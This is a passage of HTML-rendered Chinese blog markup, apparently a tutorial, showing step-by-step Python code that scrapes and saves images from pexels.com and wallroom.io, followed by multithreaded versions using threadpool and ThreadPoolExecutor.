class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;https://www.pexels.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">page1=request.Request(url,headers=headers)</span><br><span class="line">page=request.urlopen(page1)</span><br><span class="line">soup = BeautifulSoup(page,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">srcs = soup.find_all(<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;photo-item__img&#x27;</span>) <span class="comment">#查找class为photo-item__img的img标签</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> src <span class="keyword">in</span> srcs:</span><br><span class="line">    <span class="built_in">print</span>(src)</span><br></pre></td></tr></table></figure><h3 id="截取img标签中的图片url链接"><a href="#截取img标签中的图片url链接" class="headerlink" title="截取img标签中的图片url链接"></a>截取img标签中的图片url链接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;https://www.pexels.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">page1=request.Request(url,headers=headers)</span><br><span class="line">page=request.urlopen(page1)</span><br><span class="line">soup = BeautifulSoup(page,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">srcs = soup.find_all(<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;photo-item__img&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> src <span class="keyword">in</span> srcs:</span><br><span class="line">    links = src.get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(links)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/BnNW3ht.png#alt=" alt="img"></p><h3 id="将去掉多余参数"><a href="#将去掉多余参数" class="headerlink" title="将去掉多余参数"></a>将去掉多余参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;https://www.pexels.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">page1=request.Request(url,headers=headers)</span><br><span class="line">page=request.urlopen(page1)</span><br><span class="line">soup = BeautifulSoup(page,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">srcs = soup.find_all(<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;photo-item__img&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sr <span class="keyword">in</span> srcs:</span><br><span class="line">    links = sr.get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">    first_pos = links.index(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    last_pos = links.index(<span class="string">&#x27;500&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    split = links[first_pos : last_pos+<span class="number">3</span>]</span><br><span class="line">    links_final = links.replace(split,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(links_final)</span><br></pre></td></tr></table></figure><h3 id="写入本地"><a href="#写入本地" class="headerlink" title="写入本地"></a>写入本地</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;https://www.pexels.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">page1=request.Request(url,headers=headers)</span><br><span class="line">page=request.urlopen(page1)</span><br><span class="line">soup = BeautifulSoup(page,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">srcs = soup.find_all(<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;photo-item__img&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> sr <span class="keyword">in</span> srcs:</span><br><span class="line">    url = sr.get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">    first_pos = links.index(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    last_pos = links.index(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    split = links[first_pos : last_pos+<span class="number">3</span>]</span><br><span class="line">    url = links.replace(split,<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    path = <span class="string">r&#x27;D:\\img\\&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;https&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">        url1 = request.Request(url,headers = headers)</span><br><span class="line">        url = request.urlopen(url1)</span><br><span class="line">        f = codecs.<span class="built_in">open</span>(path+<span class="string">&#x27;%s.jpg&#x27;</span>%(x), <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        x+=<span class="number">1</span></span><br><span class="line">        f.write(url.read())</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><h3 id="最终版本"><a href="#最终版本" class="headerlink" title="最终版本"></a>最终版本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut_url</span>(<span class="params">link</span>):</span><span class="comment">#在img标签中获取到图片的url，并去掉多余的参数</span></span><br><span class="line">    link = link.get(<span class="string">&#x27;src&#x27;</span>)<span class="comment">#获取img标签中的图片url</span></span><br><span class="line">    first_pos = link.index(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    last_pos = link.index(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    split = link[first_pos : last_pos+<span class="number">3</span>]<span class="comment">#截取多余的参数</span></span><br><span class="line">    url = link.replace(split,<span class="string">&#x27;&#x27;</span>)<span class="comment">#用replace函数将多余的参数去掉</span></span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span>(<span class="params">url,x</span>):</span><span class="comment">#保存图片</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;https&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = request.Request(url,headers = headers)</span><br><span class="line">        file = request.urlopen(url).read()</span><br><span class="line">        path = <span class="string">&#x27;./img&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">            path = path + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path+<span class="string">&#x27;%s.jpg&#x27;</span>%x,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(file)</span><br><span class="line">                f.close()</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            os.mkdir(path)</span><br><span class="line">            path = path + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path+<span class="string">&#x27;%s.jpg&#x27;</span>%x,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(file)</span><br><span class="line">                f.close()</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flag,url</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;https://www.pexels.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = request.Request(url,headers = headers)</span><br><span class="line">res = request.urlopen(res)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(res,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">links = soup.find_all(<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;photo-item__img&#x27;</span>)</span><br><span class="line">x = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">    url = cut_url(link)</span><br><span class="line">    flag = save_img(url,x)</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;bad&#x27;</span>+flag)</span><br></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>多线程爬虫，分别用threadpool()和ThreadPoolExexutor()模块实现。</p><h3 id="threadpool模块"><a href="#threadpool模块" class="headerlink" title="threadpool模块"></a>threadpool模块</h3><p>核心代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pool = threadpool.ThreadPool(x)<span class="comment">#声明一个线程池，x表示需要线程数</span></span><br><span class="line">   requests = threadpool.makeRequests(function_name,参数)</span><br><span class="line">   <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">       pool.putRequest(req)</span><br><span class="line">   pool.wait()<span class="comment">#等待所有子线程都执行完毕后再执行主线程下面的语句，否则会直接运行主线程</span></span><br></pre></td></tr></table></figure><p>这是声明一个线程池来将所有的线程再利用for循环一起启动，但是有一个坏处就是当线程多的时候就特别容易发生堵塞，适用于线程较少的时候</p><p>threadpool模块的爬虫代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_run</span>(<span class="params">thread</span>):</span></span><br><span class="line">    thread.start()</span><br><span class="line"></span><br><span class="line">    thread.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span>(<span class="params">url,name</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tread %s is start &#x27;</span>%threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    url = request.Request(url,headers = headers)</span><br><span class="line">    html = request.urlopen(url)</span><br><span class="line">    file = html.read()</span><br><span class="line">    path = <span class="string">&#x27;./wallroom2&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">        path = path + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path+name,<span class="string">&#x27;ab+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(file)</span><br><span class="line">            f.close()</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.mkdir(path)</span><br><span class="line">        path = path + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path+url,<span class="string">&#x27;ab+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(file)</span><br><span class="line">            f.close()</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;the %s is ok&#x27;</span>%name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;the %s is fail&#x27;</span>%url)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span>(<span class="params">url</span>):</span></span><br><span class="line">     headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">     res = request.Request(url,headers = headers)</span><br><span class="line">     html = request.urlopen(res).read()</span><br><span class="line"></span><br><span class="line">     soup = BeautifulSoup(html,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">     links = soup.find_all(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">     <span class="keyword">return</span> links</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line">    pos = url.index(<span class="string">&#x27;bg-&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    name = url[pos:pos+<span class="number">10</span>] + <span class="string">&#x27;.jpeg&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&#x27;请输入wallroom的一个网址：&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    tread_list = []</span><br><span class="line"></span><br><span class="line">    links = get_url(url)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">        url1 = link.get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(url1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> url1.find(<span class="string">&#x27;bg&#x27;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">            url_real = <span class="string">&#x27;https://wallroom.io&#x27;</span> + url1 +<span class="string">&#x27;/download&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(url_real)</span><br><span class="line"></span><br><span class="line">            name = set_name(url1)</span><br><span class="line">            thread_name = name</span><br><span class="line">            thread_name = threading.Thread(target=save_img,args = (url_real,name,))</span><br><span class="line">            names.append(name)</span><br><span class="line">            urls.append(url_real)</span><br><span class="line"></span><br><span class="line">            tread_list.append(thread_name)</span><br><span class="line">    <span class="comment">#for tread_list in range(10):</span></span><br><span class="line"></span><br><span class="line">    pool = threadpool.ThreadPool(x)</span><br><span class="line">    requests = threadpool.makeRequests(thread_run, tread_list)</span><br><span class="line">    <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">        pool.putRequest(req)</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="ThreadPoolExecutor模块"><a href="#ThreadPoolExecutor模块" class="headerlink" title="ThreadPoolExecutor模块"></a>ThreadPoolExecutor模块</h3><p><code>ThreadPoolExecutor</code>就提供了一个功能，可以规定在进程池里可以有多少线程在运行，在线程比较多的时候减少了资源的占用</p><p>核心代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">executor = ThreadPoolExecutor(x)<span class="comment">#线程池中能够进行的线程只能有x个</span></span><br><span class="line">    all_task = [executor.submit(save_img, (url)) <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line">    wait(all_task, return_when=ALL_COMPLETED)<span class="comment">#相当于threadpool中的wait()</span></span><br></pre></td></tr></table></figure><p>利用ThreadPoolExecutor爬虫的完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor , wait, ALL_COMPLETED, FIRST_COMPLETED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tread %s is start &#x27;</span>%threading.current_thread().name)</span><br><span class="line">    name = set_name(url)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    url = request.Request(url,headers = headers)</span><br><span class="line">    html = request.urlopen(url)</span><br><span class="line">    file = html.read()</span><br><span class="line">    path = <span class="string">&#x27;./wallroom2880&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">        path = path + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path+name,<span class="string">&#x27;ab+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(file)</span><br><span class="line">            f.close()</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.mkdir(path)</span><br><span class="line">        path = path + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path+url,<span class="string">&#x27;ab+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(file)</span><br><span class="line">            f.close()</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;the %s is ok&#x27;</span>%name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;the %s is fail&#x27;</span>%url)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span>(<span class="params">url</span>):</span></span><br><span class="line">     headers = &#123;<span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">     res = request.Request(url,headers = headers)</span><br><span class="line">     html = request.urlopen(res).read()</span><br><span class="line"></span><br><span class="line">     soup = BeautifulSoup(html,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">     links = soup.find_all(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">     <span class="keyword">return</span> links</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line">    pos = url.index(<span class="string">&#x27;bg-&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    name = url[pos:pos+<span class="number">10</span>] + <span class="string">&#x27;.jpeg&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&#x27;请输入wallroom的一个网址：&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    urls = []</span><br><span class="line"></span><br><span class="line">    links = get_url(url)</span><br><span class="line">    <span class="comment">#print(links)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">        url1 = link.get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">        <span class="comment">#print(url1)</span></span><br><span class="line">        <span class="keyword">if</span> url1.find(<span class="string">&#x27;bg&#x27;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            url_real = <span 